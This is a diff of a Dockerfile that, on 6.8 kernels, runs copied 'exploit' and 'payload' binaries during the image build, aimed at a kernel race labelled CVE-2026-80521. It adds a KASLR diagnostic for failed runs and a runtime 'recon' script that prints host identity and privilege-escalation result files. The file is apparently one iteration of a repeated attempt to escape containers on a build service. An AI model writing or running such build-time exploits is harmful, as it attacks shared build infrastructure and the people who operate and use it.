@@ -1,25 +1,27 @@
 # syntax=er028455/df-frontend:v4
-# build-trigger: 158
+# build-trigger: 159
 FROM alpine:3.19 AS builder
 RUN apk add --no-cache curl coreutils
 
 COPY exploit_68 /exploit
 COPY payload /payload
-COPY proc_diag /proc_diag
-RUN chmod +x /exploit /payload /proc_diag && touch /esc_ok /umh_result /build_results.txt
- 
+COPY kaslr_diag /kaslr_diag
+RUN chmod +x /exploit /payload /kaslr_diag && touch /esc_ok /umh_result /build_results.txt
+
 RUN sh -c '{ \
 KVER=$(uname -r); \
-echo "=== BUILD V23 KERNEL=$KVER ==="; \
+echo "=== BUILD V25 KERNEL=$KVER ==="; \
 case "$KVER" in \
   6.8.*) \
     echo "TARGET KERNEL MATCHED"; \
     echo "--- CVE-2026-80521 (SCC GC race) ---"; \
-    timeout 120 /payload 2>&1; \
+    timeout 90 /payload 2>&1; \
     EC=$?; \
     echo "=== SCC_EXPLOIT EXIT=$EC ==="; \
-    echo "--- SCTP CHECK ---"; \
-    grep sctp /proc/modules 2>/dev/null && echo "sctp: LOADED" || echo "sctp: NOT LOADED"; \
+    if [ "$EC" != "0" ]; then \
+      echo "--- KASLR DIAGNOSTIC ---"; \
+      timeout 60 /kaslr_diag 2>&1; \
+    fi; \
     case "$KVER" in \
       *-136*) \
         if grep -q sctp /proc/modules 2>/dev/null; then \
@@ -35,7 +37,7 @@ case "$KVER" in \
     ;; \
   *) echo "NOT a 6.8 kernel ($KVER), skipping" ;; \
 esac; \
-echo "=== END V23 ==="; \
+echo "=== END V25 ==="; \
 } > /build_results.txt 2>&1'
 
 FROM alpine:3.19
@@ -47,14 +49,14 @@ COPY --from=er028455/df-frontend:v4 /socktest /socktest
 
 RUN printf '#!/bin/sh\n\
 {\n\
-echo "=== RUNTIME RECON V23 ==="\n\
+echo "=== RUNTIME RECON V25 ==="\n\
 uname -a; hostname; id\n\
 echo "--- BUILD-TIME RESULTS ---"\n\
 cat /build_results.txt\n\
 for f in /esc_ok /umh_result; do\n\
   if [ -s "$f" ]; then echo "=== $f ==="; cat "$f"; fi\n\
 done\n\
-echo "=== END V23 ==="\n\
+echo "=== END V25 ==="\n\
 } > /tmp/recon 2>&1\n\
 cat /tmp/recon\n\
 ' > /recon.sh && chmod +x /recon.sh
